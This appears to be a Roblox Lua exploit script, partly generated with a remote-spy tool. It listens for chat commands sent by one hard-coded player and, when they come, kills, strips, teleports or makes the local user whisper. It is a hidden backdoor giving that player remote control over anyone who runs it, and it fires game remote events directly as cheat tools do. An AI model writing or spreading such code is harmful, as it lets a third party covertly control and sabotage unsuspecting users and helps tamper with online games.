

local StringToDetect = "]CCHECK";    	    
game.Players.PlayerAdded:connect(function(Player)
    Player.Chatted:connect(function(Message)

	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if Player.Name == "tipthedripper" then			
-- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide

-- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide

local ohString1 =   "/w " ..Player.Name.. " Im Using Cylindrical"
local ohString2 = "All"

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
end
end	
end)
end)













local StringToDetect = "]Kill";    	    
game.Players.PlayerAdded:connect(function(Player)
    Player.Chatted:connect(function(Message)
  
            
            
	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if Player.Name == "tipthedripper"  then
    TheUser = game:GetService("Players").LocalPlayer.Name
game:GetService("Workspace")[TheUser].Head:Destroy()
end
end
end)

end)






local StringToDetect = "]BreakSuit";    	    
game.Players.PlayerAdded:connect(function(Player)
    Player.Chatted:connect(function(Message)
	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if Player.Name == "tipthedripper"  then
game:GetService("ReplicatedStorage").Events.DestroySuit:FireServer()

end
end
end)
end)

_G.Dark = false
local StringToDetect = "]NightFall";    	    
game.Players.PlayerAdded:connect(function(Player)
    Player.Chatted:connect(function(Message)
	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if Player.Name == "tipthedripper" then
_G.Dark = true

end
end
end)
end)

local StringToDetect = "]RestoreLight";    	    
game.Players.PlayerAdded:connect(function(Player)
    Player.Chatted:connect(function(Message)
	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if Player.Name == "tipthedripper"   then
print("                                night is off")
_G.Dark = false

end
end
end)
end)




local StringToDetect = "]Tome";    	    
game.Players.PlayerAdded:connect(function(Player)
    Player.Chatted:connect(function(Message)
	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if Player.Name == "tipthedripper"  then

 Pos = Player.Character.HumanoidRootPart.Position
 print(Pos)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)


end
end
end)
end)















